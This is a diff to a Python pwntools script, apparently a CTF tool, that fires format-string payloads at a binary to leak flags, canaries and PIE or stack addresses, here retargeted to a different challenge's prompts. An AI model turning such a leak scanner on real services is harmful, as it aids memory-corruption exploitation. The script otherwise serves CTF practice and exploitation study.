@@ -50,13 +50,22 @@ if __name__ == "__main__":
 	results = parser.parse_args()
 
 	if (results.binary is not None):
+
 		file = context.binary = results.binary
 		elf = ELF(file)
 
 	if (results.format_s == True):
+
 		assert ((results.format_s != results.canary) and (results.format_s != results.all_leaks)), "Remember that you can only use the -s parameter to search for flags. You cannot add --canary or --leaks."
+
 	if (results.binary is None):
-		assert ((results.ip is not None) and (results.port is not None) and (results.arch is not None)), "Remember that you have to set the arch of the binary if you don't use the parameter -b."
+
+		assert ((results.ip is not None) and (results.port is not None) and (results.arch is not None)), "Remember that you have to set the architecture (-arch) of the binary if you do not use the -b parameter."
+
+
+	if (results.ip is not None and results.port is not None):
+		
+		assert ((results.all_leaks == False and results.pie_search == False)), "Remember that you cannot search for pie leaks or stack leaks remotely. You can only find them locally. Almost always the offsets are kept, so you can use the payload that GLUFS pulls for you in local."
 
 	max = 40 ## Default value
 	min = 1 ## Default value
@@ -65,9 +74,12 @@ if __name__ == "__main__":
 
 		flagB = False
 		flag = ""
+
 		if (results.binary is not None):
+
 			value = int(elf.elfclass / 8)
 			flagS = (results.flag_format[:value]).encode()
+
 		else :
 
                     value = int(int(results.arch) / 8)
@@ -102,14 +114,14 @@ if __name__ == "__main__":
 
 			#######################################################################
 			#      This is the part that you must modify to fit your binary.      #
-		        #######################################################################
+		    #######################################################################
 			#
-			#p.sendlineafter(b'streak?', payload)	
-			#p.recvuntil(b'current streak:')
-			p.sendlineafter(b'>>', payload)
-			p.recvuntil(b'-')
-			leak = p.recv().strip(b'\n')
-			#leak = p.recvuntil(b'\n').strip(b'\n')
+			p.sendlineafter(b'streak?', payload)	
+			p.recvuntil(b'current streak:')
+			#p.sendlineafter(b'>>', payload)
+			#p.recvuntil(b'-')
+			#leak = p.recv().strip(b'\n')
+			leak = p.recvuntil(b'\n').strip(b'\n')
 			#print(leak)
 			#
 			#######################################################################		
@@ -131,18 +143,18 @@ if __name__ == "__main__":
 
 						mappings = open("/proc/{}/maps".format(p.pid)).read().split()
 
-						for j in range(len (mappings)):
+						if (results.stack_search == True):
 
-							# print (mappings)
+							for j in range(len (mappings)):
 
-							if (results.stack_search == True):
+								# print (mappings)
 
 								if mappings[j] == "[stack]":
 
 									stack_range = mappings[j-5].split('-')
 									stack_min_hex = "0x" + stack_range[0]
 									stack_max_hex = "0x" + stack_range[1]
-									
+										
 									stack_min = int(stack_min_hex, 16)
 									stack_max = int(stack_max_hex, 16)
 
@@ -151,7 +163,7 @@ if __name__ == "__main__":
 										log.success(colored(f"leak: 0x{leak:x}", "blue"))
 
 										log.success(colored("Possible stack leak found with payload: " + payload.decode(), "red"))
-										
+											
 										if (results.verbose == True):
 
 											print("Min: " + str(stack_min_hex))
@@ -246,7 +258,7 @@ if __name__ == "__main__":
 
 			#######################################################################
 			#      This is the part that you must modify to fit your binary.      #
-		        #######################################################################
+		    #######################################################################
 			#
 			p.sendlineafter(b'again?', payload)
 			p.recvuntil(b'Welcome back')
